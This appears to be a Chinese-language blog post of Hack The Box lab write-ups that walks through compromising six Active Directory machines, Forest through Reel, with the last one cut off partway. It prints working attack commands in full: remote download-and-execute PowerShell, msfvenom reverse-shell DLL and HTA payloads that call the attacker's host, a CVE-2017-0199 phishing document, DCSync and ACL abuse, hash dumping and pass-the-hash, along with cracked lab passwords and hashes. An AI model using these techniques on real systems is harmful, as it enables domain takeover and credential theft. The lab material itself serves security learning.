---
layout: post
title: Active Directory 101 (tracks)
categories: [HTB, AD , tracks]
tags: [HTB, ' AD', hard, insane, medium, easy, web, red team]
date: 2024-09-06
excerpt: "10 台 AD 的 tracks。"
body_class: post-page
---



# Active Directory 101 (tracks)
![image](https://hackmd.io/_uploads/HJVwUs0NR.png)

---

# Forest
![image](https://hackmd.io/_uploads/HycO8j040.png)

## port

![image](https://hackmd.io/_uploads/ByAeui040.png)
![image](https://hackmd.io/_uploads/HJpWOjANC.png)

## smb

`smbclient -N -L \\10.10.10.161`

![image](https://hackmd.io/_uploads/Bk-S6jRN0.png)

`crackmapexec smb 10.10.10.161 --users`

![image](https://hackmd.io/_uploads/SyczCjREC.png)

## shell as svc-alfresco

`rpcclient -U "" -N 10.10.10.161`

![image](https://hackmd.io/_uploads/BkroWn040.png)

I made a userlist 

> Administrator
> andy
> lucinda
> mark
> santi
> sebastien
> svc-alfresco

It's svc-alfresco's passwd (NP as no passwd)

![image](https://hackmd.io/_uploads/B1vYXnCV0.png)

`hashcat -m 18200 passwd /usr/share/wordlists/rockyou.txt`

![image](https://hackmd.io/_uploads/S1K7rh0ER.png)

> $krb5asrep$23$svc-alfresco@HTB.LOCAL:9c053d5be6f451f06253e868dc6a682f$0cb6371dc79a67b3530894...(.etc):s3rvice

`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice `

![image](https://hackmd.io/_uploads/BJAGI20V0.png)

![image](https://hackmd.io/_uploads/ry8BipCNC.png)

## user.txt

d89fd463fb425be88b36cc0d64c7f98c
![image](https://hackmd.io/_uploads/B19baT04A.png)


## shell as adminstrator

我要使用這個，it's called bloodhound
他使用圖來揭示 Active Directory 或 Azure 環境中隱藏的且通常是無意的關係。(直白點就是將關係視覺化，並且像是資料庫一樣將他們的relative連出來)
https://linux.vbird.org/somepaper/20050817-ldap-1.pdf

https://github.com/BloodHoundAD/BloodHound.git
https://github.com/BloodHoundAD/SharpHound.git
https://0xdf.gitlab.io/2018/11/10/htb-reel.html#bloodhound

powershell 上傳 (記得在本機用python建立通道)
本來是打算是用powershell不會被kill的方法
結果產出得檔案一直被kill

```
wget "http://10.10.14.2:8000/SharpHound.exe" -OutFile "C:\Users\svc-alfresco\Documents\SharpHound.exe"
```

### bloodhound

![image](https://hackmd.io/_uploads/S1RmX0C4A.png)

![image](https://hackmd.io/_uploads/HkpV-GeSA.png)

ps. 記得要先在本機下載neo4j、bloodhound

as 教學 先去neo4j改密碼改完瀏覽器關掉，terminal 不要關
![image](https://hackmd.io/_uploads/ryypsfxr0.png)

然後開一個新的terminal，把bloodhound打開

![image](https://hackmd.io/_uploads/r1BzCzgr0.png)

會跳出這個頁面，輸入帳號跟剛剛改的密碼
![image](https://hackmd.io/_uploads/Sy-ERGlHA.png)

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
windows版的http.server
![image](https://hackmd.io/_uploads/ryM3RMeBC.png)

```
copy 20240605231916_BloodHound.zip \\10.10.14.2\kali
```
將zip下載到本機
![image](https://hackmd.io/_uploads/BkMS1XxSA.png)

接著直接將zip檔案拖曳進去
![image](https://hackmd.io/_uploads/SJrzZQlB0.png)

去查名稱就會找到
![image](https://hackmd.io/_uploads/ryw4-XxSC.png)

點他然後標記他
![image](https://hackmd.io/_uploads/S12wbmxr0.png)

接著選最下面那個find shortest path to domain admin
![image](https://hackmd.io/_uploads/r1qFf7eHA.png)

出現的按鈕點到底
![image](https://hackmd.io/_uploads/B1o3GQgrR.png)

看很多writeup 發現大家的好像都長得不太一樣
![image](https://hackmd.io/_uploads/SJilQmgBC.png)

按下這個之後可以知道，要從目前的身分組 到htb.local需要經過什麼 
![image](https://hackmd.io/_uploads/rk527Ver0.png)

like this
![image](https://hackmd.io/_uploads/ByGRNEerC.png)

但我覺得這樣不太明白(不確定是因為版本問題還是啥)

這條是我們目前的身分，可以看到他同時有 
service account、privileged account
![image](https://hackmd.io/_uploads/SJha3WbBA.png)

1. Account Operators 群組授予使用者有限的帳戶建立權限。因此，使用者 svc-alfresco 可以在網域中建立其他使用者。(他們在同個群組之中)
2. Account Operators 群組對 Exchange Windows Permissions 群組具有 GenericAll 權限。此權限本質上賦予成員對群組的完全控制權，因此擁有允許成員直接修改群組成員的資格。
(對GenericAll按右鍵可以看解說跟使用方法)
![image](https://hackmd.io/_uploads/B1go-zbHC.png)
3. 由於 svc-alfresco 是 Account Operators 的成員，因此他能夠修改 Exchange Windows Permissions Permissions 的權限。
4. Exchange Windows Permissions 群組對網域 HTB.LOCAL 具有 WriteDacl 權限。此權限允許成員修改網域上的 DACL（自由存取控制清單）。
https://learn.microsoft.com/zh-tw/windows/win32/secauthz/dacls-and-aces

![image](https://hackmd.io/_uploads/SJqzaWZSR.png)

### how we gonna get the admin

總歸就是：
因為svc-alfresco在Account Operators之下，Account Operators 有可以完全控制群組的權限，而Exchange Windows Permissions 有write dacl的權限。

所以我們要做的就是：
1. 建立一個user 
2. 把它加入Exchange Windows Permissions的群組
3. 再給他DCSync許可權
4. 增加acl的權限(內容?)，總之就是修改dacl的意思
5. 最後透過此用戶轉儲NTLM 哈希值，拿到admin
可以直接拿hash值登入的原因：https://en.wikipedia.org/wiki/Pass_the_hash

### DCSycn 原理
DCSycn：https://tttang.com/archive/1634/
DC(網域控制器) 是 AD 的支柱，為了防止domain崩潰，造成癱瘓，通常會選擇備份，或是同時部屬多台DC，但資料是時時更新的，所以定期會需要同步資料(may be 1 per 15 min)
同步資料是透過Microsoft的遠端目錄複製服務協定(MS- DRSR),該協定是基於MSRPC / DCE/RPC )進行的。而其DRS 的Microsoft API 是DRSUAPI

當一個網域控制器（DC 1）想要從其他網域控制站（DC 2）取得資料時，DC 1 會向DC 2 發起一個GetNCChanges 請求，該請求的資料包含需要同步的資料。如果需要同步的資料比較多，則會重複上述過程。 
DCSync 就是利用的這個原理，透過Directory Replication Service（DRS） 服務的GetNCChanges 介面向域控發起資料同步請求。

在domain內的用戶所具有的權限其實最根本是看用戶的DACL，那麼對於DCSync攻擊來說，只要域用戶擁有以下三條DACL即可向域控發出資料同步請求，從而dump去域內用戶hash ，這三條DACL分別為：

1. 複製目錄更改（DS-Replication-Get-Changes）
2. 全部複製目錄更改 (DS-Replication-Get-Changes-All )
3. 在過濾集中複製目錄更改(可有可無)（DS-Replication-Get-Changes-In-Filtered-Set）

預設本機管理員、網域管理員或企業管理員以及網域控制站電腦帳號的成員預設具有上述權限
注意，預設情況下，DCSync 攻擊的物件如果是唯讀網域控制站(RODC)，則會失效，因為RODC 是不能參與複製同步資料到其他DC 的。

### DCSycn attack

這個網站有詳細的攻擊過程的方法，其中PowerView是一個可以改寫dacl的工具
https://burmat.gitbook.io/security/hacking/domain-exploitation
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview

kali裡面有
![image](https://hackmd.io/_uploads/rk9ufX-SR.png)

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:1111/PowerView.ps1')
```

先把poweview 上傳上去 (這邊似乎是不需要，都沒呼叫到它，而且其實機器裡面本來就有)

![image](https://hackmd.io/_uploads/SJZiUQWBR.png)

接著我不知道為甚麼分開打指令會失敗，和在一起就會成功
總之我做的是，更改我們目前的帳號(這樣就不用多想一個了)
其中中間有一個secstr是負責儲存資料(帳密)的
```bash=
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

`net group 'Exchange Windows Permissions'`

可以發現他已經被加入到特權帳戶裡了
![image](https://hackmd.io/_uploads/BJVrvQbSA.png)

```
sudo impacket-secretsdump HTB.local/svc-alfresco:s3rvice@10.10.10.161
```

可以用impacket-secretsdump 來拿到所有帳密的hash值
> htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

![image](https://hackmd.io/_uploads/HJf2uQbBC.png)

> evil-winrm -i 10.10.10.161 -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

![image](https://hackmd.io/_uploads/Hy5CFQbHR.png)

### root

![image](https://hackmd.io/_uploads/r1EM9XbH0.png)

### root.txt

5126e4ffb56091025341fb173a087d27
![image](https://hackmd.io/_uploads/HyYS9m-r0.png)

---

# Sauna

![image](https://hackmd.io/_uploads/ryQhcmWHC.png)

## port

![image](https://hackmd.io/_uploads/SJyh1N-BC.png)

## web

nothing intersting
![image](https://hackmd.io/_uploads/HkNp1NWSR.png)

maybe it can use ?
![image](https://hackmd.io/_uploads/Hyg1l4ZBA.png)

我把名字存起來
(名字、名字第一個字母加姓)
![image](https://hackmd.io/_uploads/SkDRY4brA.png)

## GET IN SERVER

> impacket-GetNPUsers -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/' -usersfile user -format hashcat -outputfile hash

看起來是第2筆資料：fsmith
> $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f704868d58533bb34e9176988fa92774$e99329509857b022d6f9df9d1c245e0a6795988276beeaa983db77383ef9aa2aef7d332fe7f3ece857383844df9f60e9bc692f97f381349dae3786ad628d73903dd79ce7f35717567c2fb259fd6c8d1559706b126a9b1096b13e944daa94da4d5041a88bbcc97cf92875af50c25a610398a6634be6fec63747ed89b60fb2af8f90583e40cb66885096eb7cd32b51deded5d4dddb281cfba513097f2fb337535dc42b43c83e74f438dcbde31fac8c6024956b86ec46c275d77bc1095b1e10b23212605813c7a1fb2a78ce85a4f7274b3c3c918c2e3e265dcd196678e0c0e209d8654d5afd26de4de93ff1c1a482d53f0d9792ce645bc35c9285437e9d99f9ca44

![image](https://hackmd.io/_uploads/rk1164bBC.png)

用hashcat 解密
`hashcat -m 18200 passwd /usr/share/wordlists/rockyou.txt`

![image](https://hackmd.io/_uploads/r1kZA4-SC.png)

fsmith：Thestrokes23

## SHELL as fsmith

用evil-winrm 登入 fsmith

![image](https://hackmd.io/_uploads/HkbNJHWrR.png)

### user.txt

7c1d859010e28c14509176a12b5ade1f
![image](https://hackmd.io/_uploads/HknS1HbH0.png)

#### bloodhound

![image](https://hackmd.io/_uploads/rkOaxSWr0.png)

暫時不能用
因為我載不下來

### winpeans

所以我傳了winpeans

![image](https://hackmd.io/_uploads/r1HbHBWrR.png)

我在自動登入憑證裡面找到一組帳密
svc_loanmanager：Moneymakestheworldgoround!
![image](https://hackmd.io/_uploads/HJKZDSWBC.png)

去看user只發現一個長得很像的🤔
![image](https://hackmd.io/_uploads/BJXoDH-SR.png)

我試著登入

## Shell as svc_loanmgr

![image](https://hackmd.io/_uploads/B1wIdrWSC.png)

### bloodhound

延續前面做過的bloodhound
上傳之後下載zip檔
但好像還是不能下載
but 我想到我可以建一個共用資料夾 as smbserver

#### smb share

![image](https://hackmd.io/_uploads/BkudcrWrA.png)
![image](https://hackmd.io/_uploads/HJl2qSbS0.png)

進入方法
![image](https://hackmd.io/_uploads/H1fojH-BC.png)

在這裡可以呼叫到自己電腦的檔案，在目標電腦執行，然後結果產生在自己電腦裡
![image](https://hackmd.io/_uploads/BkaKAHbSC.png)

記得打開neo4j 跟 登入 bloodhound

看起來我們可以直接進行DCSync(撇除前面的更改dacl)
![image](https://hackmd.io/_uploads/HyU_JLWSC.png)

### DCSync

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
> 
![image](https://hackmd.io/_uploads/HJoVfUZr0.png)

## admin

![image](https://hackmd.io/_uploads/HJxymIbSC.png)


### root.txt

f526c5e5c92be25ba29bb0e6503ce345
![image](https://hackmd.io/_uploads/HkQ-QLWrA.png)

---

# Active

![image](https://hackmd.io/_uploads/HynzEI-SR.png)

## port

Domain: active.htb
![image](https://hackmd.io/_uploads/B1f2xWQBR.png)

## smb

發現smb之下有一些disk
![image](https://hackmd.io/_uploads/B16FWWmHA.png)

用smbmap 掃，發現Replication 是個唯獨檔
![image](https://hackmd.io/_uploads/ryRhXZmH0.png)

接著找下去裡面有很多檔案
![image](https://hackmd.io/_uploads/BkkBV-mSR.png)

可以用
RECURSE ON 
PROMPT OFF
然後mget * 
把所有檔案下載
但我是先一個一個看
所以我發現了一個xml檔案
一樣是用mget * 下載

![image](https://hackmd.io/_uploads/SkVpObmr0.png)

name="active.htb\SVC_TGS"
cat 出來可以發現有帳戶跟密碼

![image](https://hackmd.io/_uploads/SJ9ehbQBC.png)

### GPP

**Group Policy Preference (GPP) 群組原則**
每當建立新的群組原則首選項 (GPP) 時，都會在 SYSVOL 共用中建立一個包含該設定資料的 xml 文件，其中包括與 GPP 關聯的任何密碼。為了安全起見，Microsoft AES 在將密碼儲存為cpassword.但隨後微軟在 MSDN 上公佈了金鑰！

Microsoft 在 2014 年發布了一個補丁，阻止管理員將密碼輸入 GPP。但該補丁對任何已經存在的可破解密碼沒有任何作用，據我了解，滲透測試人員在 2018 年仍然經常發現這些密碼

https://0xdf.gitlab.io/2018/12/08/htb-active.html

---

## Shell as SVC_TGS

所以我們要先解密碼

### decrypt

GPPstillStandingStrong2k18
![image](https://hackmd.io/_uploads/S1AZyMmBA.png)

解開之後我再度去看一下它的權限
發現它有比較多權限可以讀取
![image](https://hackmd.io/_uploads/Bkcszz7H0.png)

進去看之後可以直接看使用者的檔案
![image](https://hackmd.io/_uploads/SyCjQMXBR.png)

### user.txt

![image](https://hackmd.io/_uploads/Bkn6QMXBA.png)

8d471df36001718635ee2ccaf2d780ea
![image](https://hackmd.io/_uploads/SyZ8SGXSR.png)

## shell as root

前面好像沒有特別講有關Kerbers的東西

### Kerberoasting

https://www.tsnien.idv.tw/Security_WebBook/chap14/14-4%20Kerberos%20%E8%AA%8D%E8%AD%89%E7%B3%BB%E7%B5%B1%E7%B0%A1%E4%BB%8B.html

kerbers 就是個windows認證帳戶的網路協定
當您想要使用 Kerberos 對某些服務進行身份驗證時，您可以聯絡 DC 並告訴它您想要對哪個系統服務進行身份驗證。它使用服務用戶的密碼雜湊對對您的回應進行加密。您將該回應傳送給該服務，該服務可以使用其密碼對其進行解密，檢查您是誰，並決定是否允許您進入。

在 Kerberoasting 攻擊中，您將使用離線暴力破解與服務相關的密碼，而不是將加密的票證從 DC 傳送到服務。

大多數情況下，您需要網域上的活動帳戶才能初始化 Kerberoast，但如果 DC 設定了UserAccountControl 設定「不需要 Kerberos 預先驗證」，則可以要求並接收破解票證，而無需網域上的有效帳戶。

https://0xdf.gitlab.io/2018/12/08/htb-active.html

### attack start

可以先掃看到服務有沒有存在
![image](https://hackmd.io/_uploads/Sklc6MXSC.png)

SPN (service principal name)
如果在使用者帳戶上設定了 SPN，則可以要求該帳戶的服務票證並嘗試破解它以檢索使用者密碼。此攻擊稱為Kerberoast

找到admin的密碼
![image](https://hackmd.io/_uploads/BkkAxmmS0.png)

`hashcat -m 13100 passwd /usr/share/wordlists/rockyou.txt`

Administrator：Ticketmaster1968

### root.txt

用smbmap掃一下有什麼權限
![image](https://hackmd.io/_uploads/BkVeTXXHC.png)

連上smbclient
![image](https://hackmd.io/_uploads/BJWVa7XSA.png)

root.txt
![image](https://hackmd.io/_uploads/Hygdpm7HR.png)

e4213210512ca63465ea1f04d6bb8275
![image](https://hackmd.io/_uploads/Bk3Op77S0.png)

---

# Blackfield

![image](https://hackmd.io/_uploads/SyoBAQmHR.png)

## port

![image](https://hackmd.io/_uploads/S1OfSzEBR.png)

## smb

掃smb
![image](https://hackmd.io/_uploads/By5P8MVrR.png)

用smbmap去看一下現在可以讀取的權限
![image](https://hackmd.io/_uploads/HygtkPNr0.png)

我先看了profiles，裡面都是空的，感覺像是姓名

![image](https://hackmd.io/_uploads/ry-cggHHA.png)

我想著如何有效率的存取

我先掛載這個資料夾
![image](https://hackmd.io/_uploads/B1LWIxHS0.png)

然後用ls 只會print 1行的方式將每一個資料夾的名字存入文字檔中
![image](https://hackmd.io/_uploads/BJy1AeBHC.png)

可以知道帳號叫做support
![image](https://hackmd.io/_uploads/Hkme-WSBA.png)

support:#00^BlackKnight
![image](https://hackmd.io/_uploads/rk5UbZHrC.png)


## support

我只有smb跟http的權限，沒有winrm的
![image](https://hackmd.io/_uploads/rknEGWrBA.png)

掃smbmap 發現我有 NETLOGON和SYSVOL共享的唯讀存取權限
但當我掛載上去之後，沒發現什麼可以用的東西
![image](https://hackmd.io/_uploads/H1frmZrrC.png)

### bloodhound

有一個python版本的，不需要上傳上去執行的
https://github.com/dirkjanm/BloodHound.py.git

![image](https://hackmd.io/_uploads/SJz63bHHA.png)

```
~/Tools/BloodHound.py/bloodhound.py -c all -ns 10.10.10.192 -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local
```

![image](https://hackmd.io/_uploads/rJ374fHrC.png)

執行之後會出現

![image](https://hackmd.io/_uploads/SypL4fSHR.png)

接著開啟neo4j跟bloodhound
進去之後點選 first degree odject control
https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html

![image](https://hackmd.io/_uploads/BJR_PGBH0.png)

### ForceChangePassword

接著可以看到
audit2020與suppor有force change password

![image](https://hackmd.io/_uploads/rk6UvMHSA.png)

以裡面給的敘述提到，at least有兩種攻擊方法，一個是用windows內建的net.exe 二進位檔案，但是這不會是最好的方法，另一個是用powerview中的Set-DomainUserPassword函數

方法be like
![image](https://hackmd.io/_uploads/Sk50VvSSR.png)

簡單來說我有權限改另一個帳戶的密碼
但我們無法上傳東西上去那個帳戶裡
所以我們要用rpc去改它密碼

### attack start

https://room362.com/posts/2017/reset-ad-user-password-with-linux/

這樣就可以改掉密碼了
![image](https://hackmd.io/_uploads/BJgj_DSBC.png)

可以這樣檢測有沒有改成功
![image](https://hackmd.io/_uploads/r1ryYPSH0.png)

一樣沒有winrm權限
![image](https://hackmd.io/_uploads/SkxVKvBB0.png)

但可以看到這個帳號有比較多讀取權限
![image](https://hackmd.io/_uploads/ByLtctBB0.png)

## another user

我注意到有一個可讀取的叫做 鑑識
![image](https://hackmd.io/_uploads/Sk2Qx9rHR.png)

我在這裡發現到lsass.zip
通常系統會將憑證存入lsass
可以用procdump的方式把憑證中的hash值drop出來
https://attack.mitre.org/techniques/T1003/
https://attack.mitre.org/techniques/T1003/001/

![image](https://hackmd.io/_uploads/SJ1txcHH0.png)

我用掛載的方式載下來
```
sudo  mount -t cifs -o username=audit2020,password='password123!',domain=blackfield.local,vers=2.0 //10.10.10.192/forensic for
```

![image](https://hackmd.io/_uploads/SJXWQsrr0.png)

另外我也發現了
![image](https://hackmd.io/_uploads/S1oGJiHHC.png)

### admin password(it's a hole)

domain_admin 裡面有admin的密碼
Administrator:Ipwn3dYourCompany
![image](https://hackmd.io/_uploads/S1qcJirSC.png)

### lsass

我們來處理這個
![image](https://hackmd.io/_uploads/SyZxNoSB0.png)

解壓縮之後得到一個dmp檔
![image](https://hackmd.io/_uploads/HkdmEoBr0.png)

我們可以用pypykatz去轉儲DMP檔得內容
svc_backup
NT: 9658d1d1dcd9250115e2205d9f48400d
![image](https://hackmd.io/_uploads/SyhMUjrHC.png)

掃一下發現它有winrm的權限
![image](https://hackmd.io/_uploads/Sk71worS0.png)

## svc_backup

![image](https://hackmd.io/_uploads/rywIDiSSA.png)


### user.txt

3920bb317a0bef51027e2852be64b543
![image](https://hackmd.io/_uploads/rJqODorr0.png)

## admin

因為前面都沒有看過這個身分，所以進去之後先查身分的權限
發現它有SeBackupPrivilege,可以用來提權
https://www.backup4all.com/what-are-backup-operators-kb.html

![image](https://hackmd.io/_uploads/HJgO_oSHC.png)

### 方法1

https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/diskshadow
https://ithelp.ithome.com.tw/articles/10307947

先建立sha.dsh ，然後把檔案轉換成dos文字

![image](https://hackmd.io/_uploads/H1h9g1LBA.png)

![image](https://hackmd.io/_uploads/Bye6vW1LBR.png)

![image](https://hackmd.io/_uploads/HyBnN_IB0.png)
![image](https://hackmd.io/_uploads/r1l64d8rR.png)


https://github.com/giuliano108/SeBackupPrivilege.git
~~偷一下別人的圖~~，用wget 就好

![image](https://hackmd.io/_uploads/By2u1FUH0.png)

要記得存取 hkml
![image](https://hackmd.io/_uploads/SytOiOUBC.png)

然後去把ntds.dit抓下來
![image](https://hackmd.io/_uploads/H1EYoOLSA.png)

用同個方法抓下來
![image](https://hackmd.io/_uploads/HktUCuIH0.png)

等它跑就可以拿到所有帳號的hash
![image](https://hackmd.io/_uploads/HyppkF8HC.png)


### 方法2

修改acl 

```
$NTDS = "C:\Windows\NTDS\ntds.dit"
$acl = Get-Acl $NTDS
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("blackfield.local\svc_backup","FullControl","Allow")
$acl.SetAccessRule($AccessRule)
$acl | Set-Acl $NTDS
```

這段是確認有沒有修改正確

`Get-acl $NTDS | select -expand accesstostring`


![image](https://hackmd.io/_uploads/Bk699OUHR.png)

接著寫入這段

```
set context persistent nowriters#
add volume c: alias binsec#
create#
expose %binsec% z:#
```

然後用diskshadow執行它

![image](https://hackmd.io/_uploads/S1xuj_LrR.png)

要記得存取 hkml
![image](https://hackmd.io/_uploads/SytOiOUBC.png)

然後去把ntds.dit抓下來
![image](https://hackmd.io/_uploads/H1EYoOLSA.png)

用同個方法抓下來
![image](https://hackmd.io/_uploads/HktUCuIH0.png)

跑了半小時
![image](https://hackmd.io/_uploads/HJJKLtUrC.png)

administrator：184fb5e5178480be64824d4cd53b99ee
![image](https://hackmd.io/_uploads/HkYqUYLBC.png)

### root.txt

![image](https://hackmd.io/_uploads/r1GbwKUrR.png)

4375a629c7c67c8e29db269060c955cb


---

# Resolute

![image](https://hackmd.io/_uploads/HkZ2wFISA.png)

---

## port

![image](https://hackmd.io/_uploads/rk5voK8r0.png)
![image](https://hackmd.io/_uploads/Hy8ujFISC.png)

### smb

![image](https://hackmd.io/_uploads/H1fc3FIBC.png)


### rpc

![image](https://hackmd.io/_uploads/r1iyTY8SR.png)

可以使用queryuser
![image](https://hackmd.io/_uploads/BkWQatLHC.png)

利用querydispinfo，發現一個帳戶和它的密碼
marko：Welcome123!
![image](https://hackmd.io/_uploads/HkgkqTFISC.png)

## marko

![image](https://hackmd.io/_uploads/H14D0FUSR.png)

被騙ㄌ

## another

`crackmapexec smb 10.10.10.169 --users`

我用crackmapexec 去掃它的用戶
![image](https://hackmd.io/_uploads/SyYE1c8HA.png)

`crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!'`

我將用戶放進文字檔中，去找哪個用戶的密碼跟這個一樣
melanie:Welcome123!
![image](https://hackmd.io/_uploads/H1WfecUH0.png)

## melanie

它有winrm的權限
![image](https://hackmd.io/_uploads/S1sug5USC.png)

![image](https://hackmd.io/_uploads/H1r6ecIrR.png)

### user.txt

eb89dbfeb526d253373b5d9c88b396f1
![image](https://hackmd.io/_uploads/Hk_1-cISC.png)

## another one

在window中 ls -force = ls -al
在C槽的底層中發現了隱藏起來的資料夾

![image](https://hackmd.io/_uploads/ryQVz9UrA.png)

其中這裡有個隱藏的目錄
![image](https://hackmd.io/_uploads/rJg3zqUSR.png)

隱藏的目錄中有個隱藏的檔案
![image](https://hackmd.io/_uploads/SkukX9IHA.png)

裡面看起來像是ternimal的歷史紀錄
在裡面看到另一個帳戶的帳號密碼
ryan:Serv3r4Admin4cc123!
![image](https://hackmd.io/_uploads/Bk0Qm98S0.png)

## ryan

![image](https://hackmd.io/_uploads/ByN5E9IHR.png)

發現了一個note.txt，裡面說要做任何改變都要在一分鐘以內
![image](https://hackmd.io/_uploads/rk-TN9UrC.png)

透過列舉可以發現有一個MEGABANK\DnsAdmins
![image](https://hackmd.io/_uploads/BJpGHqIr0.png)

### attack start

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f dll -o rev.dll`
用msfvenom 建一個dll檔的 reverse shell
![image](https://hackmd.io/_uploads/ByAi5qLBC.png)

把smbserver打開來
![image](https://hackmd.io/_uploads/B1uvsqUS0.png)

用dnscmd 執行這個dll(這步之前先開監聽)
![image](https://hackmd.io/_uploads/ryjNa98HC.png)

把dns重開，等它一下
![image](https://hackmd.io/_uploads/rkVra58rA.png)

smbserver出現這個等於flow跑過來了
![image](https://hackmd.io/_uploads/rJgOp9USC.png)

要記得開著
![image](https://hackmd.io/_uploads/BkSFpqIHR.png)


### root.txt

4be0dc80ce145abb4b8725d73bb65599
![image](https://hackmd.io/_uploads/rJZApq8SC.png)


---

# Reel

![image](https://hackmd.io/_uploads/BJ7Z1s8rR.png)

---
## port

![image](https://hackmd.io/_uploads/Sy1W06wr0.png)
![image](https://hackmd.io/_uploads/rJyGRTvS0.png)
![image](https://hackmd.io/_uploads/HydH0pPr0.png)
![image](https://hackmd.io/_uploads/Bk88ApPBA.png)



## ftp

裡面有一個文字檔跟兩個word檔
![image](https://hackmd.io/_uploads/HJNIJRvHC.png)

nott insterested
![image](https://hackmd.io/_uploads/BJBcSRvrA.png)

AppLocker.docx
![image](https://hackmd.io/_uploads/S1X61ADSA.png)

Windows Event Forwarding.docx
原本他顯示檔案損壞，要不要還原

裡面得內容看起來是ternimal的紀錄

![image](https://hackmd.io/_uploads/HkXTSADHC.png)
![image](https://hackmd.io/_uploads/SkS0rAvrA.png)
https://learn.microsoft.com/zh-tw/windows/win32/wec/wecutil

裡面有一個電子信箱
nico@megabank.com
![image](https://hackmd.io/_uploads/rkYbhRPS0.png)


## smtp

看起來很怪，基本上他都accept
![image](https://hackmd.io/_uploads/H1hzCCvSA.png)

### RTF attack

依據前面有出現word檔以及電子信箱，有個釣魚漏洞CVE-2017-0199，利用釣魚攻擊，讓受害者點開word檔，接著他會向http 丟一個socket ，攻擊者可以透過他連進受害者的電腦

https://blog.trendmicro.com.tw/?p=51750

> CVE-2017-0199：
> 會建立一個惡意 RTF 文件，當在易受攻擊的 Microsoft Word 版本中開啟該文件時，將導致程式碼執行。此缺陷存在於 olelink 物件如何發出 http(s) 請求並執行 hta 程式碼作為回應的方式中。

### attack start

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f hta-psh -o msfv.hta
```

先建立一個reverse shell
![image](https://hackmd.io/_uploads/H1oAb1dHR.png)

接著用建一個rtf檔案
https://github.com/bhdresh/CVE-2017-0199.git

* -M gen- 產生文檔
* -w invoice.rtf- 輸出檔名
* -u http://10.10.14.4/msfv.hta- 取得 hta 的 url
* -t rtf- 建立 rtf 文件（與 ppsx 相反）
* -x 0- 禁用 rtf 混淆

![image](https://hackmd.io/_uploads/ryK1H1_HC.png)

接著先開監聽，以及http(為了讓他抓到你的reverse shell)
![image](https://hackmd.io/_uploads/HkgjPkuSR.png)

然後寄email
![image](https://hackmd.io/_uploads/HyPZLk_BC.png)

等他一下
![image](https://hackmd.io/_uploads/ryASd1_BA.png)

## NICO

### user.txt
8ce58351fd982082e1bdad2dec66f10e
![image](https://hackmd.io/_uploads/SkFq_1dHA.png)

### xml

桌面有一個xml檔案，裡面寫著tom的密碼
內容看起來是他用powershell裡的PSCredential來儲存密碼
而他會自動轉換成其他格式來保護密碼
https://learn.microsoft.com/zh-tw/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.4
![image](https://hackmd.io/_uploads/HkfJF1uBC.png)

可以用powershell中的Import-CliXml將他轉回來
Tom:1ts-mag1c!!!

```powershell=
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

![image](https://hackmd.io/_uploads/S110T1uSC.png)

## tom

![image](https://hackmd.io/_uploads/Hy8mRydBA.png)

![image](https://hackmd.io/_uploads/S1LE0yOHA.png)

tom的桌面有一個ad audit的資料夾
![image](https://hackmd.io/_uploads/H1t_01OSA.png)

裡面的note 說沒有ad攻擊到admin的路徑，要去重跑其他用戶
![image](https://hackmd.io/_uploads/HyA3RJ_HA.png)

進到資料夾最深處有一個acls.csv
![image](https://hackmd.io/_uploads/Bked1g_BR.png)

我架了一個smb來抓檔案
![image](https://hackmd.io/_uploads/HkvTR7dH0.png)
![image](https://hackmd.io/_uploads/SJIlkN_HC.png)
![image](https://hackmd.io/_uploads/rk2yJ4Or0.png)

用excel打開，看一下writeowner
發現tom有claire的write 權限
![image](https://hackmd.io/_uploads/SkgOS4uS0.png)

查了claire 發現它有backuo_admin的write 的權限
![image](https://hackmd.io/_uploads/SJXkiNdSA.png)

## claire

有寫入權限，基本上就是可以寫入acl的權限
先執行powerview.ps1

![image](https://hackmd.io/_uploads/H1YRB8Or0.png)

然後修改tom讓他變成claire acl的擁有者
接著重製claire的密碼
`claire：qwer1234QWER!@#$`

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
![image](https://hackmd.io/_uploads/BJu1LU_SR.png)
```powershell=
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$pass = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
Set-DomainUserPassword Claire -AccountPassword $pass -Verbose
```

成功了之後會出現
![image](https://hackmd.io/_uploads/rymbR8dS0.png)

接著就可以用ssh 去連上claire

![image](https://hackmd.io/_uploads/BkvokPOS0.png)

## backup_admin
查看身分組的group 發現一個名字叫做 ranj
![image](https://hackmd.io/_uploads/HyT9zwuH0.png)

把claire加在裡面
![image](https://hackmd.io/_uploads/ryiOXPurA.png)

再查看身分組
![image](https://hackmd.io/_uploads/SJQ9XwdSR.png)

